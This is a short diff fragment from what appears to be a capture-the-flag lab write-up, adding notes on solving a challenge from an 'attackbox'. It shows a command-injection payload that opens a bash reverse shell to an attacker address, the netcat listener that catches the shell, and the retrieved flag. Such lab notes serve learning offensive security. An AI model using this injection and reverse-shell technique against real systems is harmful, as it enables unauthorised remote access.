@@ -250,6 +250,21 @@ date -d @1667483948 && echo $FLAG
 Thu Nov  3 13:59:08 UTC 2022
 flag{7da6c7debd40bd611560c13d8149b647}
 
+using attackbox
+
+;bash -i >& /dev/tcp/10.10.31.231/4444 0>&1
+
+root@ip-10-10-31-231:~# nc -lvnp 4444
+Listening on [0.0.0.0] (family 0, port 4444)
+Connection from 10.10.73.246 37898 received!
+bash: cannot set terminal process group (1): Inappropriate ioctl for device
+bash: no job control in this shell
+challenge@e7c1352e71ec:~$ echo $FLAG
+echo $FLAG
+flag{7da6c7debd40bd611560c13d8149b647}
+
+
+it works, maybe need to fix my machine 😔 
 
 
 ```
